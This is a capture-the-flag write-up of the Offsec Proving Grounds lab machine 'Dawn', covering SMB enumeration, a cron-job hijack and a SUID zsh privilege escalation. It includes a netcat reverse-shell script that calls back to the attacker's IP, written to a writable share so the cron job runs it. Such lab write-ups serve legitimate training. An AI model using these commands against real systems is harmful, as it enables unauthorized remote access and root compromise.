---
title: "Proving grounds Play: Dawn"
layout: post
date: 2023-09-23 02:00
tag: 
- CTF
- Offsec labs
- OSCP
- Writeup
- Linux
- Pg-Play
writeups: true
hidden: true
author: Naveen
description: "Offsec proving grounds play linux machine writeup"
---

## Nmap

```sh
PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.38 ((Debian))
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
3306/tcp open  mysql       MySQL 5.5.5-10.3.15-MariaDB-1
```

## Web PORT: 80

### Directory Fuzzing

![img](/assets/images/CTF/Proving_Grounds/Dawn/dir.png)

### Logs

![img](/assets/images/CTF/Proving_Grounds/Dawn/logs.png)

## SMB Enumeration

```sh
smbclient -L //192.168.175.11/ -N
```

![img](/assets/images/CTF/Proving_Grounds/Dawn/smb1.png)

As per the `management.log` file there is a cron job running on `ITDEPT` folder, and in SMB we have access to the ITDEPT folder.

```log
2020/08/12 09:03:02 [31;1mCMD: UID=1000 PID=939    | /bin/sh -c /home/dawn/ITDEPT/product-control [0m
```

Create file named `product-control` add a reverse shell code to the file and upload it in the SMB server.

```sh
#!/bin/bash
nc -c bash 192.168.45.223 1234
```

So when the cronjob runs the script we will get the reverse shell.

![img](/assets/images/CTF/Proving_Grounds/Dawn/smb2.png)

Wait for few seconds for the cron job to run.

![img](/assets/images/CTF/Proving_Grounds/Dawn/shell.png)

**Initial Foothold Obtained**

## Privilege Escalation

Check the user permissions `sudo -l` the user  `Dawn` has permission to run `/usr/bin/msql` without password. But unfortunately it didn't work.

### SUIDs

```sh
dawn@dawn:~$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/sbin/mount.cifs
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/su
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/mount
/usr/bin/zsh #Odd to be here
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/fusermount
/usr/bin/umount
/usr/bin/chfn
```

The SUID `zsh` is exploitable, direct to GTFO bins and find the exploit.

![img](/assets/images/CTF/Proving_Grounds/Dawn/root.png)

**Root Obtained**

Thanks for reading!

For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).